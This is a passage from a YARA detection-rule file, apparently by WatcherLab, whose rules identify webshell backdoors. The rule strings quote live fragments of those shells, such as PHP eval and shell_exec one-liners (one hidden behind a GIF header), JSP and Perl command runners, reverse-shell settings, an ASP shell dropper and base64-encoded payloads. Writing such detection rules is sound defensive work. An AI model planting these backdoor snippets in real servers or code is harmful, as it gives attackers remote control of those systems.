        $s11 = "ookies{'passs'};$dbb=$Cookies{'dbb'};&PrintPageHeader(\"c\");sql_vars_set();sql_loginform();$qqquery=$in{'table'};print <<END;" fullword ascii
        $s12 = "print \"$tbb$verd\";$dbh=DBI->connect(\"DBI:mysql:$dbb:$hhost:$pport\",$usser,$passs);$sth=$dbh->prepare('SHOW DATABASES');$sth-" ascii
        $s13 = "print \"$tbb$verd\";$dbh=DBI->connect(\"DBI:mysql:$dbb:$hhost:$pport\",$usser,$passs);$sth=$dbh->prepare(\"SHOW DATABASES\");$st" ascii
        $s14 = "$sec_key='1a6510970ba6c98d7e8cfe1e96f3f4d2';# XOR-key: encrypt POST in Console mode (md5)" fullword ascii
        $s15 = ");$phpv=phpv();$hosts=hosts();$downloaders=downloaders();&PrintPageHeader(\"c\");print \"<h1>System information</h1>\";print \"$" ascii
        $s16 = "q \"hexdump\"){&HEXDUMP;}elsif($Action eq \"command1\"){&ExecuteCommand1;}elsif($Action eq \"filemanager\"){&FileManager;}elsif(" ascii
        $s17 = "}sub PrintLoginForm{print \"<center><form name=f method=POST><input type=password name=p><input type=submit value='>>'></form></" ascii
        $s18 = "q{u}\"if($q{u});return $s;}sub downloaders{$s=\"which lynx links wget GET fetch curl\";$s.=\" -U $q{u}\"if($q{u});return $s;}sub" ascii
        $s19 = "$Password=\"63a9f0ea7bb98050796b649e85481845\";# shell md5(pass)" fullword ascii
        $s20 = "</td><td width=1 align=right><nobr><span>Server IP:</span><br>$ENV{'SERVER_ADDR'}<br><span>Client IP:</span><br>$ENV{'REMOTE_ADD" ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 200KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule a8ebe8a0d95dc33a4e5356948fc4ec126a08d9a2
{
    meta:
        description = "others - file a8ebe8a0d95dc33a4e5356948fc4ec126a08d9a2.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "00a274f884edbbb4e4a4c2d472c435a3bee9840eefbd63b735ed041602ba293f"
    strings:
        $s1 = "# PerlKit-0.1 - http://www.t0s.org" fullword ascii
        $s2 = "# browse.pl: Browse and download files from a webserver" fullword ascii
        $s3 = "my ($dev,$ino,$mode,$nlink,$uid,$gid,$rdev,$size, $atime,$mtime,$ctime,$blksize,$blocks) = stat($file);" fullword ascii
        $s4 = "# Get parameters" fullword ascii
        $s5 = "print \"Content-Type: text/html\\r\\n\";" fullword ascii
        $s6 = "$ret .= \"<td>\". getgrgid($gid) .\"</td>\";" fullword ascii
        $s7 = "$ret .= \"<td>\". getpwuid($uid) .\"</td>\";" fullword ascii
        $s8 = "if(-f $path) { # Download selected file" fullword ascii
        $s9 = "$value =~ s/\\+/ /g ;" fullword ascii
        $s10 = "print get_fileinfo($path, $_). \"\\n\";" fullword ascii
        $s11 = "<form action=\"\" method=\"GET\">" fullword ascii
        $s12 = "$file=~s/\\/[^\\/]+\\/\\.\\./\\//g;" fullword ascii
        $s13 = "Directory ' . $path . ' contents:" fullword ascii
        $s14 = "<input type=\"text\" name=\"path\" size=45 value=\"' . $path . '\">" fullword ascii
        $s15 = "sub get_fileinfo ($$) {" fullword ascii
        $s16 = "print \"Content-Type: application/octet-stream\\r\\n\";" fullword ascii
        $s17 = "opendir(DIR, $path) || print \"Could not open directory\";" fullword ascii
        $s18 = "open(FILE, \"< $path\") || print \"Could not open file\\n\";" fullword ascii
        $s19 = "$ret .= \"$filename <a href=\\\"?path=$file\\\">[D]</a>\" ;" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 5KB and ( 8 of them ) ) or ( all of them )
}

rule sig_4f1b10634e6890e5b967b246bd29f9f3557af016
{
    meta:
        description = "others - file 4f1b10634e6890e5b967b246bd29f9f3557af016.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e2e1e3c846c260443a1825ad4c0ef4da98e5583de8bd938a98138635a96b07a9"
    strings:
        $s1 = "example: hmass.pl -p public_html -i hacked.html -d c:\\inetpub\\wwwroot\\" fullword ascii
        $s2 = "#example: hmass.pl -p public_html -i hacked.html -d c:\\inetpub\\wwwroot\\" fullword ascii
        $s3 = "#usage: hmass.pl -i <ownedindex.html> -d <defacepath> -p <rootpath>" fullword ascii
        $s4 = "usage: hmass.pl -i <ownedindex.html> -d <defacepath> -p <rootpath>" fullword ascii
        $s5 = "#mail: hackingerboy@gmail.com" fullword ascii
        $s6 = "#Special thanks: Darkc0de,CyberGhost,excellance,redLine" fullword ascii
        $s7 = "sub checkfile{$file=shift; if(!-e $file){print \"\\n\\\"$file\\\" file doesn't exists,check your index file\\n\";exit;} }" fullword ascii
        $s8 = "if(defined($d) && defined($i) && defined($p)){checkfile($i);checkdir($d);rootpathdeface($d,$p);};" fullword ascii
        $s9 = "@files = grep { -d \"$dir/$_\" } @files; #alt dizinler" fullword ascii
        $s10 = "getopts (\":p:i:d:\", \\%args);" fullword ascii
        $s11 = "sub checkdir{$dir=shift; if(!-d $dir){print \"\\n\\\"$dir\\\" path doesn't exists,check your deface path\\n\";exit;} }" fullword ascii
        $s12 = "if (index(lc($OperatingSystem),\"win\")!=-1){" fullword ascii
        $s13 = "my $OperatingSystem = $^O;" fullword ascii
        $s14 = "if(defined($d) && defined($i) && !defined($p)){checkfile($i);checkdir($d);normaldeface($d);};" fullword ascii
        $s15 = "if(!defined($d) || !defined($i)){usage();}" fullword ascii
        $s16 = "#Windows && Linux mass defacer script (c) h4ckinger" fullword ascii
        $s17 = "my @files = grep { $_ !~ /^(\\.){1,2}$/ } @files;# Bir alt dizin ve i" fullword ascii
        $s18 = "www.hackinger.org" fullword ascii
        $s19 = "default.php');" fullword ascii
        $s20 = "else{gopyala($i,\"$dzn\\\\$tekdizin\\\\$rpath\\\\$tekindex\");}" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 9KB and ( 8 of them ) ) or ( all of them )
}

rule f19cc178f1cfad8601f5eea2352cdbd2d6f94e7e
{
    meta:
        description = "others - file f19cc178f1cfad8601f5eea2352cdbd2d6f94e7e.asmx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5c533563dd8f6d629c161a3ffd5818a00f4a80e823959cdddb51b8c8fe1598ec"
    strings:
        $s1 = "R += String.Format(\"{0}/\\t{1}\\t0\\t-\\n\", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString(\"yyyy-MM-dd hh:mm:ss\"));" fullword ascii
        $s2 = "R = \"Result\\t|\\t\\r\\nExecute Successfully!\\t|\\t\\r\\n\";" fullword ascii
        $s3 = "R += String.Format(\"{0}\\t{1}\\t{2}\\t-\\n\", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString(\"yy" fullword ascii
        $s4 = "R += String.Format(\"{0}/\\t{1}\\t0\\t-\\n\", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString(\"yyy" fullword ascii
        $s5 = "if (strDat.IndexOf(\"SELECT \") == 0 || strDat.IndexOf(\"EXEC \") == 0 || strDat.IndexOf(\"DECLARE \") == 0)" fullword ascii
        $s6 = "if (strDat.IndexOf(\"SELECT \") == 0 || strDat.IndexOf(\"EXEC \") == 0 || strDat.IndexOf(\"DECLARE \") == " fullword ascii
        $s7 = "cm.ExecuteNonQuery();" fullword ascii
        $s8 = "HttpContext.Current.Response.Write(\"\\x2D\\x3E\\x7C\" + R + \"\\x7C\\x3C\\x2D\");" fullword ascii
        $s9 = "ProcessStartInfo c = new ProcessStartInfo(Z1.Substring(2));" fullword ascii
        $s10 = "c.UseShellExecute = false;" fullword ascii
        $s11 = "[WebService(Namespace = \"http://www.wooyun.org/whitehats/RedFree\")]" fullword ascii
        $s12 = "HttpContext.Current.Response.Write(\"<?xml version=\\\"1.0\\\" encoding=\\\"utf-8\\\"?>\");" fullword ascii
        $s13 = "HttpWebResponse WB = (HttpWebResponse)RQ.GetResponse();" fullword ascii
        $s14 = "SqlCommand cm = Conn.CreateCommand();" fullword ascii
        $s15 = "cm.CommandText = Z2;" fullword ascii
        $s16 = "Process e = new Process();" fullword ascii
        $s17 = "File.Copy(S + \"\\\\\" + F.Name, D + \"\\\\\" + F.Name);" fullword ascii
        $s18 = "[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]" fullword ascii
        $s19 = "R = Conn.Database + \"\\t\";" fullword ascii
        $s20 = "HttpContext.Current.Response.End();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 40KB and ( 8 of them ) ) or ( all of them )
}

rule sig_7affb18a802ca2ce38c2989dc55c847bb31b9e45
{
    meta:
        description = "others - file 7affb18a802ca2ce38c2989dc55c847bb31b9e45.cgi"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c04f88b1ec7d57a5d5181917c5561d75d4df78288161d8e03d2e4a091ca1edf9"
    strings:
        $s1 = "print \"<font color=red>Your Command Is:</font><font color=puple>$command[1]</font></br>\";" fullword ascii
        $s2 = "print '<script language=javascript>first.cmd.focus();</script>';" fullword ascii
        $s3 = "print \"Content-type:text/html \\n\\n\";#At first,I missed \\n\\n,then 500 ERROR" fullword ascii
        $s4 = "read(STDIN,$cmd,$ENV{\"CONTENT_LENGTH\"});" fullword ascii
        $s5 = "print 'Command:<input name=\"cmd\" type=text size=50>';" fullword ascii
        $s6 = "print '<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---by s3rching@bit.edu.cn';" fullword ascii
        $s7 = "$command[1]=~s/\\+/ /g;" fullword ascii
        $s8 = "@command=split(/=/,$cmd);" fullword ascii
        $s9 = "print '<input type=\"submit\" value=exec>';" fullword ascii
        $s10 = "$command[1]=~s/%/0x/g;" fullword ascii
        $s11 = "$command[1]=~s/(0x..)/chr(hex($1))/eg;#I think it is nice." fullword ascii
        $s12 = "$result=`$command[1]`;" fullword ascii
        $s13 = "print '<p><br>My First PerlShell<br>';" fullword ascii
        $s14 = "if($ENV{\"REQUEST_METHOD\"}=\"POST\")" fullword ascii
        $s15 = "print \"\\\" method=POST>\";" fullword ascii
        $s16 = "$cmd=$ENV{\"QUERY_STRING\"};" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 2KB and ( 8 of them ) ) or ( all of them )
}

rule sig_8a3708351c044bc557b0d9336342584ef568e748
{
    meta:
        description = "others - file 8a3708351c044bc557b0d9336342584ef568e748.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "844608bf41e555956f0412ceca34103b3cf2fe8a535e1c7dcb9e3a3bdc300f82"
    strings:
        $s1 = "# separated items, namely  login|encrypted password|upload path" fullword ascii
        $s2 = "# James Bee\" <JamesBee@home.com> reported that from Windows filename" fullword ascii
        $s3 = "my $upl_url=\"http://muquit.com/muquit/software/upload_pl/upload_pl.html\";" fullword ascii
        $s4 = "# such as c:\\foo\\fille.x saves as c:\\foo\\file.x, so we've to get the" fullword ascii
        $s5 = "# Sep-30-2000, muquit@muquit.com" fullword ascii
        $s6 = "#         0 if  validation fails due to password or non existence of login " fullword ascii
        $s7 = "#       errorMsg += \" \" + \"Password\" + \"\\\\n\";" fullword ascii
        $s8 = "# printError() - print error message" fullword ascii
        $s9 = "# such as c:\\foo\\fille.x saves as c:\\foo\\file.x, Fixed, Jul-22-1999" fullword ascii
        $s10 = "#    &printError(\"Will not upload! Could not validate Userid: $q::userid\");" fullword ascii
        $s11 = "my $url=\"http://www.muquit.com/muquit/\";" fullword ascii
        $s12 = "# doWork() - upload file " fullword ascii
        $s13 = "#print \"Password:\\n\";" fullword ascii
        $s14 = "# validate login name" fullword ascii
        $s15 = "# if you want to restrict upload a file size (in bytes), uncomment the" fullword ascii
        $s16 = "#$em .= \"You must specify your Password!<br>\" if !$q::password;" fullword ascii
        $s17 = "# printForm() - print the HTML form" fullword ascii
        $s18 = "#-------------- globals----------  ENDS  ------------------" fullword ascii
        $s19 = "errorMsg += \" \" + \"Upload filename\" + \"\\\\n\";" fullword ascii
        $s20 = "#   if (obj.password.value == \"\" || obj.password.value == null)" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 40KB and ( 8 of them ) ) or ( all of them )
}

rule sig_9c6c6fd4cc2466e678754bafa090a5f016586d00
{
    meta:
        description = "others - file 9c6c6fd4cc2466e678754bafa090a5f016586d00.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7495e8bfd440c45c97d8642b83d28316e998ffb1dcf91db46061fa079ad870e9"
    strings:
        $s1 = "Process p = Runtime.getRuntime().exec(str);" fullword ascii
        $s2 = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:c=\"http://java.sun.com/jsp/js" ascii
        $s3 = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:c=\"http://java.sun.com/jsp/js" ascii
        $s4 = "String tmp = pageContext.getRequest().getParameter(\"str\");" fullword ascii
        $s5 = "<jsp:directive.page contentType=\"text/html;charset=UTF-8\" pageEncoding=\"UTF-8\"/>" fullword ascii
        $s6 = "String str = new String((new BASE64Decoder()).decodeBuffer(tmp));" fullword ascii
        $s7 = "BufferedReader br = new BufferedReader(new InputStreamReader(in,\"GBK\"));" fullword ascii
        $s8 = "<jsp:directive.page import=\"sun.misc.BASE64Decoder\"/>" fullword ascii
        $s9 = "InputStream in = p.getInputStream();" fullword ascii
        $s10 = "<jsp:directive.page import=\"java.util.*\"/>" fullword ascii
        $s11 = "<jsp:directive.page import=\"java.io.*\"/>" fullword ascii
        $s12 = "if (tmp != null&&!\"\".equals(tmp)) {" fullword ascii
    condition:
        ( uint16(0) == 0x504a and filesize < 2KB and ( 8 of them ) ) or ( all of them )
}

rule sig_8faf7db1bb3f495a5325d16fb658d4e3854a6c41
{
    meta:
        description = "others - file 8faf7db1bb3f495a5325d16fb658d4e3854a6c41.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7e112e9b03ebc55ba26f5a875f5cbd92acf48923d1bf683af0462c4af2fa979f"
    strings:
        $s1 = ";<?php @eval($_POST['chopper']);?>GIF89aZ" fullword ascii
    condition:
        ( uint16(0) == 0x4947 and filesize < 2KB and ( all of them ) ) or ( all of them )
}

rule sig_6c89518d396cd10af0b5ff5da427b46364daa2d1
{
    meta:
        description = "others - file 6c89518d396cd10af0b5ff5da427b46364daa2d1.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c59cfa764203cab72c7c60554fdbeabac4a9025ce79c6c9770fe5e4d86c84be6"
    strings:
        $x1 = "$system = ($unix)?('echo \"`uname -a`\";echo \"`id`\";/bin/sh'):('cmd.exe'); " fullword ascii
        $x2 = "$SHELL=($unix)?('/bin/bash -i'):('cmd.exe');  " fullword ascii
        $s3 = "print \"<HTML><TITLE>r57pws - login</TITLE><BODY><div align=center><font face=verdana size=1>\";" fullword ascii
        $s4 = "($ENV{'CONTENT_TYPE'} =~ /multipart\\/form-data; boundary=(.+)$/)?(&get_file($1)):(&get_val());" fullword ascii
        $s5 = "## pws.pl - Perl Web Shell by RST/GHC" fullword ascii
        $s6 = "<noscript><a href=http://click.hotlog.ru/?81606 target=_top><imgsrc=\"http://hit4.hotlog.ru/cgi-bin/hotlog/count?s=81606&im=1\" " ascii
        $s7 = "<script language=\"javascript1.3\">hotlog_js=\"1.3\"</script><script language=\"javascript\">hotlog_r+=\"&js=\"+hotlog_js;docume" ascii
        $s8 = "<noscript><a href=http://click.hotlog.ru/?81606 target=_top><imgsrc=\"http://hit4.hotlog.ru/cgi-bin/hotlog/count?s=81606&im=1\" " ascii
        $s9 = "## - ??? ?????? ???????? ????? POST ???????" fullword ascii
        $s10 = "if($FORM{PASS} eq $password) { print \"Set-Cookie: PASS=\".cry($FORM{PASS}).\";\\nContent-type: text/html\\n\\n<meta HTTP-EQUIV=" ascii
        $s11 = "<title>$script_name - Perl Web Shell by RST/GHC</title>" fullword ascii
        $s12 = "(\"<a href='http://click.hotlog.ru/?81606' target='_top'><img \"+\" src='http://hit4.hotlog.ru/cgi-bin/hotlog/count?\"+hotlog_r+" ascii
        $s13 = "if(!$COOK{PASS}||($COOK{PASS} ne cry($password))) { &form_login; exit(); } " fullword ascii
        $s14 = "## - ?????????? ???????????? ?????? ?? ??????? (+ ?????? ??????)" fullword ascii
        $s15 = "print $sock \"GET $path HTTP/1.0\\nHost: $server\\n\\n\";" fullword ascii
        $s16 = "## - ???????? ?????? ?? ?????? ? ?????????? ?????????? ????????????" fullword ascii
        $s17 = "'find config* files in current dir' => 'find . -type f -name \"config*\"'," fullword ascii
        $s18 = "'find config.inc.php files in current dir' => 'find . -type f -name config.inc.php'," fullword ascii
        $s19 = "=\"http://ghc.ru\" target=_blank>http://ghc.ru</a></font> ]};" fullword ascii
        $s20 = "'target=_blank><img src=\"http://counter.yadro.ru/hit?t52.6;r'+" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 60KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_0353ae68b12b8f6b74794d3273967b530d0d526f
{
    meta:
        description = "others - file 0353ae68b12b8f6b74794d3273967b530d0d526f.phtml"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "14ee4d6daca29a576a047ec7c30efd8c11af51635f023d13772b68aead0dfda6"
    strings:
        $x1 = ". '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><br" fullword ascii
        $s2 = "//die(\"<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form></pr" fullword ascii
        $s3 = ". '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><br>' . " ascii
        $s4 = "$explink = 'http://exploit-db.com/search/?action=search&filter_description=';" fullword ascii
        $s5 = "= = [ || PiOps 1.7 <u><b>Powered By</b> </u><font color=#FF0000><a href='http://twitter.com/ops507'>@Ops507</a></font> | " fullword ascii
        $s6 = "<input type='button' value='md5.rednoize.com' onclick=\\\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.ha" fullword ascii
        $s7 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');" fullword ascii
        $s8 = "$temp = \"document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='\".addcslash" fullword ascii
        $s9 = "setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);" fullword ascii
        $s10 = "\"Encuentra el *config*.php en este directorio\" => \"dir /s /w /b *config*.php\"," fullword ascii
        $s11 = ";}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\\'\\');} return false;\"><select name=alias>';" fullword ascii
        $s12 = "echo '<span>Fecha De Creacion:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Tiempo de acceso:</span> '.date('" fullword ascii
        $s13 = "if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))" fullword ascii
        $s14 = "<input type='button' value='hashcracking.ru' onclick=\\\"document.hf.action='https://hashcracking.ru/index.php';document." fullword ascii
        $s15 = "\"Encontrar el archivo config* en este directorio\" => \"find . -type f -name \\\"config*\\\"\"," fullword ascii
        $s16 = "echo '<script>p3_=\"\";</script><form onsubmit=\"g(null,null,\\'' . urlencode($_POST['p1']) . '\\',null,this.chmod.value);re" fullword ascii
        $s17 = "echo '<script>p3_=\"\";</script><form onsubmit=\"g(null,null,\\'' . urlencode($_POST['p1']) . '\\',null,this.touch.value);re" fullword ascii
        $s18 = "'HTTP_HOST'] . \" - PiOps \" . PiOps .\"</title>" fullword ascii
        $s19 = "\"encontrar archivo service.pwd en el directorio actual\" => \"find . -type f -name service.pwd\"," fullword ascii
        $s20 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SERVER" ascii
    condition:
        ( uint16(0) == 0x3f3c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_28c156798583e2c3c0128e1174c1af7895b769bb
{
    meta:
        description = "others - file 28c156798583e2c3c0128e1174c1af7895b769bb.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "05ad3b2d9eeea5d17c6fb7415ee32a2daba1763fad3400456f476f6ab659763f"
    strings:
        $x1 = "$source=get $url.\"?usr=\".$usr.\"&pass=\".$pass.\"&idc=$_(\\'perl -e \\\"symlink('$target','$sym')\\\"\\');\";" fullword ascii
        $s2 = "$source=get $url.\"?usr=\".$usr.\"&pass=\".$pass.\"&idc=$_('ln -s $target $sym');\";" fullword ascii
        $s3 = "print \"Enter Target Path (/home/idc/public_html/config.php)\\nEnter Target Path : \";" fullword ascii
        $s4 = "$source=get $url.\"?usr=\".$usr.\"&pass=\".$pass.\"&idc=symlink('$target','$sym');\";" fullword ascii
        $s5 = "print \"\\\"$cmd\\\" Command NotFound 404;) \\nFor more information Enter \\\"help\\\"\";" fullword ascii
        $s6 = "ps         The 'ps' command  display the list of running processes." fullword ascii
        $s7 = "$source=get $url.\"?usr=\".$usr.\"&pass=\".$pass.\"&idc=$_(\\\"uname -an\\\");\";" fullword ascii
        $s8 = "$source=get $url.\"?usr=\".$usr.\"&pass=\".$pass.\"&idc=$_('ls -la');\";" fullword ascii
        $s9 = "download   The 'download' command downloads a file from the remote machine" fullword ascii
        $s10 = "$source=get $url.\"?usr=\".$usr.\"&pass=\".$pass.\"&idc=$_('echo www.idc-team.net');\";" fullword ascii
        $s11 = "$source=get $url.\"?usr=\".$usr.\"&pass=\".$pass.\"&idc=$_('ps -A');\";" fullword ascii
        $s12 = "@fun=(\"system\",\"passthru\",\"exec\",\"shell_exec\");" fullword ascii
        $s13 = "print \"\\nEnter symlink Path (/home/me/public_html/sym.txt)\\nEnter symlink Path : \";" fullword ascii
        $s14 = "$source=get $url.\"?usr=\".$usr.\"&pass=\".$pass.\"&idc=$_(\\\"$cm\\\");\";" fullword ascii
        $s15 = "+---++---==[Coded by : M.R.S.CO]" fullword ascii
        $s16 = "$source=get $url.\"?usr=\".$usr.\"&pass=\".$pass.\"&idc=$_('pwd');\";" fullword ascii
        $s17 = "$source=get $url.\"?usr=\".$usr.\"&pass=\".$pass.\"&idc=$_('id');\";" fullword ascii
        $s18 = "chomp($target=<STDIN>);" fullword ascii
        $s19 = "#Friends : G3n3Rall,MR.CILILI,BlacK.King,Nafsh,b3hz4d,E2MA3N,Skote_Vahshat,Bl4ck.Viper,Mr.Xpr" fullword ascii
        $s20 = "#Coded BY M.R.S.CO " fullword ascii
    condition:
        ( uint16(0) == 0x4923 and filesize < 10KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule b2cd5428bed45c9e78aff3b068dd746d6d926aef
{
    meta:
        description = "others - file b2cd5428bed45c9e78aff3b068dd746d6d926aef.cgi"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "79e258bbddc51a7484aac84ed339510534a8faac89b44a82f46336e7b5c779f3"
    strings:
        $s1 = "$shell_password = \"devilzc0der\";" fullword ascii
        $s2 = "$shell_fake_name = \"Server Logging System\";" fullword ascii
        $s3 = "$shell_code = \"JHhTb2Z0d2FyZSA9ICZ0cmltKCRFTlZ7IlNFUlZFUl9TT0ZUV0FSRSJ9KTsNCiR4U3lzdGVtID0gJnRyaW0oJF5PKTsNCiR4U2VydmVySVAgPSAm" ascii
        $s4 = "## greets: devilzc0der(s) and all of you who love peace and freedom" fullword ascii
        $s5 = "## ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^" fullword ascii
        $s6 = "## devilzShell <[cgi]>" fullword ascii
        $s7 = "$shell_name = \"devilzShell\";" fullword ascii
        $s8 = "th($chunk))%4)).\"\\n\";}$result;}eval(b64decode($shell_code));" fullword ascii
        $s9 = "$shell_fav_port = \"12345\";" fullword ascii
        $s10 = "$shell_version = \"v1\";" fullword ascii
        $s11 = "gkJZXhpdDsNCgl9DQoJZWxzZXsNCgkJJGltZyA9ICR7IiRmaWxlIn07DQoJCXByaW50ICJDb250ZW50LXR5cGU6IGltYWdlL3BuZ1xuXG4iOw0KCQliaW5tb2RlIFNUR" ascii
        $s12 = "0JVc29CQmxjMHVFVk9ha1dVDQp2eE1MS05xQThWNGMwclpXeVowbHpiSTJNOXJUcE5mS0QrUmlBVitNWDllaUNzOSt5VjJlY0xrYWNQZ2FVdmNOeGN1dVdIVzlQZ3IyD" ascii
        $s13 = "UlZWUNjMVFibnhTZEd4Z2QybThZZkEwRzdGMHlwR0oNCkFFTncySXk0Wm5ObFlHSlBzRFBpRmp0VFEyeEJEeVBZakZraVpBdzVDRmd5bW5HR0lScmJCZlpSRGtQbGJJW" ascii
        $s14 = "1Jud0xHUjhoSGJpSzUvYVF6Q2NDMEZQLyt1MllHNEtQeDIrcDE0U0tWVGJGSWlQZEk3L2VpDQpvTDk4d2htQXQ4YnYzTzdZODlzSXYyOWt6T3BTdkVOUjQxbFNEMUpoM" ascii
        $s15 = "FFvZ2ZRMEtJR1IxY0RJb1ptUXNJREFwT3cwSw0KSUdSMWNESW9abVFzSURFcE93MEtJR1IxY0RJb1ptUXNJRElwT3cwS0lHVjRaV05zS0NJdlltbHVMM05vSWl3aWMyZ" ascii
        $s16 = "UprbEVRVlI0Mm1Oa0FBSXBLYW4vYjk2OFlXQUUNCk1aNDlld2FtR2RuWTJQNkxpSWd3Z0FRQTh4WU5ZaGVvdE5jQUFBQUFTVVZPUks1Q1lJST0iOw0KJHhCYWNrID0iS" ascii
        $s17 = "3pVUGRrTXNady83REdvRVZrQUxvVHh3QlAzMjc5OE5qUVNialZ4RzBERHINCno0UDlRc04xQXZmWXliN2IrcExELzBNRU5nU01XY1BNQUIwZm84QlJQUUp4Q0hJVWdVS" ascii
        $s18 = "$shell_title = \" :: \".$shell_name.\" ::\";" fullword ascii
        $s19 = "mdWQmJHQU5ZR3RNRFVpQkNqMzJOenRTWlF4RFFVTlFCMDF2WkN5Y1JiaHlaVWdxcUZZamMyZkJIak10QzA5RlRTZC8NClZJQmx3dDU1Y0NVUFYxUnJ1eVU4YWpTVlEwM" ascii
        $s20 = "3MgPX4gbS93aW4vaSl7DQoJCXJldHVybiAxOw0KCX0NCgllbHNlew0KCQlyZXR1cm4gMDsNCgl9DQp9DQpzdWIgRElSRUNUT1JZX1NFUEFSQVRPUigpew0KCWlmKCZpc" ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule e15d5141d0134d244e6adf5e6baa1870c28b7395
{
    meta:
        description = "others - file e15d5141d0134d244e6adf5e6baa1870c28b7395.ashx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "93512be8f5f5051c8486c333829f253b14c201753fbec8d0ed41010de5c7bcf8"
    strings:
        $s1 = "file1.Write(\"<%response.clear:execute request(\\\"root\\\"):response.End%>\");" fullword ascii
        $s2 = "public void ProcessRequest (HttpContext context) {" fullword ascii
        $s3 = "StreamWriter file1= File.CreateText(context.Server.MapPath(\"root.asp\"));" fullword ascii
        $s4 = "context.Response.ContentType = \"text/plain\";" fullword ascii
        $s5 = "using System.Web;" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_94c11005b6c6a7d8692e250e5ed3dd6651f29889
{
    meta:
        description = "others - file 94c11005b6c6a7d8692e250e5ed3dd6651f29889.php3"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "93982b8df76080e7ba4520ae4b4db7f3c867f005b3c2f84cb9dff0386e361c35"
    strings:
        $s1 = "$out = shell_exec($_GET['x']);" fullword ascii
    condition:
        ( uint16(0) == 0x3f3c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule e05218bd754a46a1cb2f7c61498d79fa470eb771
{
    meta:
        description = "others - file e05218bd754a46a1cb2f7c61498d79fa470eb771.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8c38efaaf8974f9d08d9a743a7403eb6ae0a57b536e0d21ccb022f2c55a16016"
    strings:
        $x1 = "#  icmpsh - simple icmp command shell" fullword ascii
        $s2 = "#  along with this program.  If not, see <http://www.gnu.org/licenses/>." fullword ascii
        $s3 = "# get identifier and sequencenumber" fullword ascii
        $s4 = "#  the Free Software Foundation, either version 3 of the License, or" fullword ascii
        $s5 = "#  Copyright (c) 2010, Nico Leidecker <nico@leidecker.info>" fullword ascii
        $s6 = "#  but WITHOUT ANY WARRANTY; without even the implied warranty of" fullword ascii
        $s7 = "#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the" fullword ascii
        $s8 = "# write data to stdout and read from stdin" fullword ascii
        $s9 = "#  You should have received a copy of the GNU General Public License" fullword ascii
        $s10 = "#  This program is distributed in the hope that it will be useful," fullword ascii
        $s11 = "#  it under the terms of the GNU General Public License as published by" fullword ascii
